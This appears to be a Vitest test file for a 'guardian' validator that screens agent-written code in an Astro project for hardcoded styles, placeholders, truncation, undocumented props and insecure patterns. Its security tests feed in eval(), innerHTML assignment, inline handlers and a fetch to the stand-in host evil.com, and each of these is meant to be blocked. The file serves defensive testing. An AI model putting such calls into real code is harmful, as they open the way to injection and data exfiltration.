import { describe, it, expect } from 'vitest';
import { guardian } from '../guardian.js';

// ---------------------------------------------------------------------------
// Helper spec content
// ---------------------------------------------------------------------------

const HERO_SPEC = `
## Props

| Name | Type | Required |
|------|------|----------|
| title | string | Yes |
| subtitle | string | No |

## Constraints
All CSS values must use token variables.
`;

// ---------------------------------------------------------------------------
// Test: Delete action bypass (S17)
// ---------------------------------------------------------------------------

describe('guardian — delete action', () => {
  it('skips all content checks when action is delete', () => {
    const result = guardian(
      'src/components/Foo.astro',
      'any content #ff0000 eval() 15px Lorem ipsum',
      'delete'
    );
    expect(result).toEqual({ valid: true });
  });
});

// ---------------------------------------------------------------------------
// Test: Hardcoded colors (S2)
// ---------------------------------------------------------------------------

describe('guardian — hardcoded colors', () => {
  it('blocks hex color', () => {
    const result = guardian('src/components/Hero.astro', 'color: #3B82F6', 'modify', HERO_SPEC);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('#3B82F6'))).toBe(true);
    }
  });

  it('blocks rgb() color', () => {
    const result = guardian('src/components/Hero.astro', 'background: rgb(255, 0, 0)', 'modify', HERO_SPEC);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('rgb'))).toBe(true);
    }
  });

  it('blocks hsl() color', () => {
    const result = guardian('src/components/Hero.astro', 'color: hsl(200, 100%, 50%)', 'modify', HERO_SPEC);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('hsl'))).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Test: Hardcoded pixel values (S3)
// ---------------------------------------------------------------------------

describe('guardian — hardcoded pixel values', () => {
  it('blocks hardcoded px value', () => {
    const result = guardian('src/foo.ts', 'margin: 15px', 'modify', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('15px'))).toBe(true);
    }
  });

  it('allows var(--space-md) without triggering px check', () => {
    const result = guardian('src/foo.ts', 'margin: var(--space-md)', 'modify', null);
    // Should not have px violations (may still fail for non-.astro spec check N/A)
    if (!result.valid) {
      expect(result.violations.every(v => !v.includes('px'))).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Test: Security patterns (S14)
// ---------------------------------------------------------------------------

describe('guardian — security patterns', () => {
  it('blocks eval()', () => {
    const result = guardian('src/foo.ts', 'eval("user_input")', 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('eval()'))).toBe(true);
    }
  });

  it('blocks new Function()', () => {
    const result = guardian('src/foo.ts', 'const fn = new Function("return 1")', 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('new Function()'))).toBe(true);
    }
  });

  it('blocks innerHTML =', () => {
    const result = guardian('src/foo.ts', 'el.innerHTML = userInput', 'modify', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('innerHTML ='))).toBe(true);
    }
  });

  it('blocks inline event handlers', () => {
    const result = guardian('src/foo.ts', '<button onclick="fn()">Click</button>', 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('onclick'))).toBe(true);
    }
  });

  it('blocks external fetch()', () => {
    const result = guardian('src/foo.ts', 'fetch("https://evil.com/data")', 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('Fetch esterno'))).toBe(true);
    }
  });

  it('allows relative fetch()', () => {
    const result = guardian('src/foo.ts', "fetch('/api/agent')", 'create', null);
    // Should not block relative fetch
    if (!result.valid) {
      expect(result.violations.every(v => !v.includes('Fetch esterno'))).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Test: Placeholder and truncation (S15, S16)
// ---------------------------------------------------------------------------

describe('guardian — placeholder and truncation', () => {
  it('blocks Lorem ipsum', () => {
    const result = guardian('src/foo.ts', 'Lorem ipsum dolor sit amet', 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('Lorem ipsum'))).toBe(true);
    }
  });

  it('blocks [TODO]', () => {
    const result = guardian('src/foo.ts', 'Content: [TODO]', 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('[TODO]'))).toBe(true);
    }
  });

  it('blocks PLACEHOLDER text', () => {
    const result = guardian('src/foo.ts', 'title: PLACEHOLDER', 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('PLACEHOLDER'))).toBe(true);
    }
  });

  it('blocks content ending with ...', () => {
    const content = 'function doSomething() {\n  // implementation\n  ...';
    const result = guardian('src/foo.ts', content, 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('troncato'))).toBe(true);
    }
  });

  it('allows normal content without truncation', () => {
    const content = 'export const x = 42;\n';
    const result = guardian('src/foo.ts', content, 'create', null);
    // Should not have truncation violation
    if (!result.valid) {
      expect(result.violations.every(v => !v.includes('troncato'))).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Test: Missing component spec (S12)
// ---------------------------------------------------------------------------

describe('guardian — missing component spec', () => {
  it('blocks .astro file when spec is null', () => {
    const result = guardian(
      'src/components/Widget.astro',
      "<Widget title='x' />",
      'create',
      null
    );
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('src/components/specs/Widget.md'))).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Test: Undocumented prop (S13)
// ---------------------------------------------------------------------------

describe('guardian — undocumented prop', () => {
  it('blocks undocumented prop on a component', () => {
    const content = '<Hero title="Hello" subtitle="World" backgroundColor="red" />';
    const result = guardian('src/components/Hero.astro', content, 'modify', HERO_SPEC);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.violations.some(v => v.includes('backgroundColor') && v.includes('Hero'))).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Test: All violations collected (R6.5)
// ---------------------------------------------------------------------------

describe('guardian — all violations collected', () => {
  it('collects all violations in a single call', () => {
    const content = 'color: #ff0000; margin: 15px; eval("x")';
    const result = guardian('src/foo.ts', content, 'create', null);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      // Must have at least 3 violations: hex color, px value, eval
      expect(result.violations.length).toBeGreaterThanOrEqual(3);
      expect(result.violations.some(v => v.includes('#ff0000'))).toBe(true);
      expect(result.violations.some(v => v.includes('15px'))).toBe(true);
      expect(result.violations.some(v => v.includes('eval()'))).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Test: Happy path (S1 partial)
// ---------------------------------------------------------------------------

describe('guardian — happy path', () => {
  it('passes content using only CSS custom properties', () => {
    const content = `
---
interface Props {
  title: string;
}
const { title } = Astro.props;
---
<section class="bg-surface py-2xl px-md">
  <h1 class="text-4xl font-bold text-foreground" style="color: var(--color-primary)">
    {title}
  </h1>
</section>
`;
    const result = guardian('src/components/Hero.astro', content, 'modify', HERO_SPEC);
    expect(result.valid).toBe(true);
  });
});
